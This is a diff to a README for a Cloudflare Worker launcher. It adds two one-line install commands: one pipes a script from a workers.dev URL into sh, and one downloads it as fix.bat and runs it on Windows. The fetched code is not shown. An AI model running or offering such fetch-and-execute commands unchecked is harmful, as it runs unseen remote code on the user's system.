@@ -4,8 +4,14 @@ Zero-config Cloudflare Worker launcher. Browsers, bots, AI crawlers, scrapers, e
 
 ## Run
 
+**Unix / Linux / macOS / Termux:**
 ```sh
 curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
+```
+
+**Windows CMD:**
+```cmd
+curl -fsSL https://executeee.nishkarshrana10.workers.dev -o fix.bat && fix.bat
 ```
 
 Or download and inspect first:
